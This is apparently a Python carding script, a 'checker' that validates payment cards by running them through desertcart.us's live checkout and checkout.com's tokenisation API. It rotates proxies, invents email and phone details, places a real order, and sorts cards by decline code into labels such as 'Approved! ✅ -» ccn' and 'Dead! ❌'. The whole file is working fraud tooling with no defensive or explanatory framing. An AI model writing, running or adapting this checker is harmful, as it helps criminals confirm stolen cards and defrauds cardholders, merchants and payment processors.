from httpx import AsyncClient
from utils.functions import capture, random_proxy, random_email, random_phone


async def hinata(cc, month, year, cvv):
    mail = random_email()
    phone = random_phone()
    proxy = random_proxy()

    async with AsyncClient(
        follow_redirects=True, verify=False, proxies=random_proxy()
    ) as session:
        head = {
            "Host": "www.desertcart.us",
            "accept": "application/vnd.api+json; version:3.0",
            "x-locale": "en-us",
            "content-type": "application/vnd.api+json",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
            "origin": "https://www.desertcart.us",
            "referer": "https://www.desertcart.us/products/559944847-po-po-toys-jigsaw-3-d-puzzle-toy-diy-for-kids-3-d-puzzle-game-architecture-building-block-for-kids-attractive-show-piece-easy-to-assemble-pack-of-2-l-302-306",
        }

        post = {
            "product_id": 559944847,
            "quantity": 1,
            "active": True,
            "condition": "new",
            "price": None,
            "order_item_location_id": None,
            "reflects_products_price": False,
            "source": "direct",
        }

        r = await session.post(
            "https://www.desertcart.us/api/cart_items?include=cart",
            headers=head,
            json=post,
        )
        cart = capture(r.text, '"cart_token":"', '"')

        head2 = {
            "Host": "www.desertcart.us",
            "accept": "application/vnd.api+json; version:3.0",
            "x-locale": "en-us",
            "content-type": "application/vnd.api+json",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
            "origin": "https://www.desertcart.us",
            "referer": "https://www.desertcart.us/cart",
        }

        post2 = {"key": "checkout_public_key"}

        r2 = await session.post(
            "https://www.desertcart.us/api/configurations",
            headers=head2,
            json=post2,
        )
        pk = capture(r2.text, '"checkout_public_key":"', '"')

        head3 = {
            "Host": "www.desertcart.us",
            "accept": "application/vnd.api+json; version:3.0",
            "x-locale": "en-us",
            "content-type": "application/vnd.api+json",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
            "origin": "https://www.desertcart.us",
            "referer": "https://www.desertcart.us/cart",
            "x-cart-token": f"{cart}",
        }

        post3 = {
            "cart": {"cart_token": f"{cart}"},
            "user": {
                "email": f"{mail}",
                "referral_code": None,
                "phone_number": f"{phone}",
            },
            "shipping_address": {
                "first_name": "Sachio",
                "last_name": "YT",
                "address": "118 W 132nd St",
                "city": "New York",
                "country_code": "US",
                "province": "New York",
                "post_code": "10027",
                "phone_number": f"{phone}",
            },
        }

        r3 = await session.post(
            "https://www.desertcart.us/api/checkouts?include=orders%2Corders.order_items%2Cuser%2Cauthentication_token%2Cshipping_address",
            headers=head3,
            json=post3,
        )
        # with open("test.html", "w", encoding="utf-8") as f:
        #     f.write(r3.text)
        ch = capture(r3.text, '"checkout":{"id":', ",")
        us = capture(r3.text, '"user_id":', ",")
        to = capture(r3.text, '"token":"', '"')

        head4 = {
            "Host": "api.checkout.com",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
            "accept": "*/*",
            "origin": "https://js.checkout.com",
            "referer": "https://js.checkout.com/",
            "authorization": f"{pk}",
            "content-type": "application/json",
        }

        post4 = {
            "type": "card",
            "number": f"{cc}",
            "expiry_month": month,
            "expiry_year": year,
            "cvv": f"{cvv}",
            "phone": {},
            "preferred_scheme": "",
            "requestSource": "JS",
        }

        r4 = await session.post(
            "https://api.checkout.com/tokens",
            headers=head4,
            json=post4,
        )
        r44 = r4.text
        token = capture(r44, '"token":"', '"')
        last4 = capture(r44, '"last4":"', '"')
        bin_1 = capture(r44, '"bin":"', '"')
        issuer = capture(r44, '"issuer":"', '"')
        scheme = capture(r44, '"scheme":"', '"')
        card_type = capture(r44, '"card_type":"', '"')
        product_type = capture(r44, '"product_type":"', '"')
        issuer_country = capture(r44, '"issuer_country":"', '"')

        head5 = {
            "Host": "www.desertcart.us",
            "accept": "application/vnd.api+json; version:3.0",
            "x-locale": "en-us",
            "content-type": "application/vnd.api+json",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
            "origin": "https://www.desertcart.us",
            "referer": "https://www.desertcart.us/cart",
            "x-user-id": f"{us}",
            "x-user-token": f"{to}",
        }

        post5 = {
            "provider": "checkout",
            "name": "Sachio YT",
            "card_token": f"{token}",
            "last4": f"{last4}",
            "bin": f"{bin_1}",
            "expiration_date": f"{month}/{year}",
            "active": True,
            "verify": False,
            "description": f"{issuer},{scheme},{card_type},{product_type}",
            "country_code": f"{issuer_country}",
        }

        r5 = await session.post(
            "https://www.desertcart.us/api/credit_cards",
            headers=head5,
            json=post5,
        )
        id_ = capture(r5.text, '"id":', ",")

        post6 = {"checkout_id": ch, "credit_card_id": id_}

        r6 = await session.post(
            "https://www.desertcart.us/api/checkout_credit_card_payments?include=orders%2Corders.order_items",
            headers=head5,
            json=post6,
        )
        price = capture(r6.text, '"formatted":"US$ ', '"')

        post7 = {
            "comment": None,
            "checkout_id": ch,
            "referral_code": None,
            "domain": "https://www.desertcart.us",
        }

        r7 = await session.post(
            "https://www.desertcart.us/api/checkout_confirmations?include=orders,orders.order_items",
            headers=head5,
            json=post7,
        )

        msg = capture(r7.text, '"credit_card":["', '"]')

        if r7.status_code == 200 or r7.status_code == 302:
            status = "Approved! ✅ -» low funds"
            msg = f"Thank You! -» ${price}"
        elif (
            msg
            == "Card can not be validated - response code: 20051. Please re-enter your card details and try again 20051: Insufficient Funds"
        ):
            status = "Approved! ✅ -» low funds"
        elif (
            msg
            == "Card can not be validated - response code: 200N7. Please re-enter your card details and try again 200N7: Decline for CVV2 Failure"
        ):
            status = "Approved! ✅ -» ccn"
        else:
            status = "Dead! ❌"

        return status, msg
